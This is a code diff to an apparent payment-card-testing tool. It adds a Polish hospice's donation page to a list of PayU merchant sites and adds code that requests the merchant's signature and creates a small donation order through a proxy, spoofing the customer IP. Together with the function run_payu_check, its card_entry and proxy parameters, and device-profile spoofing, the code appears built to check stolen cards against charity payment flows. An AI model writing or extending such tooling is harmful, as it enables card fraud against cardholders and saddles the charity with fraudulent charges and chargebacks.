@@ -209,6 +209,40 @@ PAYU_SITES = {
             "donation_value": "5",
         },
     },
+    "hospicjum_wlodawa": {
+        "create_url": "https://www.hospicjum-wlodawa.pl/odp.php",
+        "orders_url": "https://secure.payu.com/api/v2_1/orders",
+        "create_type": "v2_1",
+        "merchant_pos_id": "3141457",
+        "referer": "https://www.hospicjum-wlodawa.pl/darowizny_new.php",
+        "origin": "https://www.hospicjum-wlodawa.pl",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "order_fields": {
+            "buyer.firstName": "{first}",
+            "buyer.lastName": "{last}",
+            "buyer.email": "{email}",
+            "buyer.phone": "",
+            "buyer.Delivery.street": "",
+            "buyer.Delivery.postalCode": "",
+            "buyer.Delivery.city": "",
+            "totalAmount": "500",
+            "currencyCode": "PLN",
+            "customerIp": "0.0.0.0",
+            "merchantPosId": "3141457",
+            "description": "Wp\u0142ata na dzia\u0142alno\u015b\u0107 Hospicjum",
+            "continueUrl": "https://hospicjum-wlodawa.pl/artykul-dziekujemy-za-wplate#tresc_art",
+            "products[0].name": "Darowizna",
+            "products[0].unitPrice": "500",
+            "products[0].quantity": "1",
+            "notifyUrl": "https://hospicjum-wlodawa.pl/artykul-dziekujemy-za-wplate#tresc_art",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -358,7 +392,28 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
 
     try:
         # 1. create the order on the merchant (json API or html form + redirect)
-        if cfg["create_type"] == "form_nonce":
+        if cfg["create_type"] == "v2_1":
+            # resolve the proxy's external IP (customerIp is part of the signature)
+            client_ip = "0.0.0.0"
+            try:
+                ipr = await s.get("https://api.ipify.org", headers={"Accept": "text/plain"})
+                client_ip = ipr.text.strip()
+            except Exception:
+                pass
+            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["order_fields"].items()}
+            form["customerIp"] = client_ip
+            # step 1: POST the merchant php -> SHA-256 signature
+            r = await s.post(cfg["create_url"], data=form,
+                             headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                                      "Content-Type": "application/x-www-form-urlencoded"})
+            sig = r.text.strip()
+            # step 2: POST api/v2_1/orders with the OpenPayu-Signature header
+            r2 = await s.post(cfg["orders_url"], data=form, allow_redirects=False,
+                              headers={"Referer": cfg["origin"] + "/", "Origin": cfg["origin"],
+                                       "Content-Type": "application/x-www-form-urlencoded",
+                                       "OpenPayu-Signature": f"sender={cfg['merchant_pos_id']};algorithm=SHA-256;signature={sig}"})
+            redirect = r2.headers.get("Location") or ""
+        elif cfg["create_type"] == "form_nonce":
             # GET the page -> extract the anti-CSRF nonce + session cookie
             r = await s.get(cfg["create_url"], headers={"Referer": cfg["referer"]})
             m = re.search(cfg["nonce_pattern"], r.text)
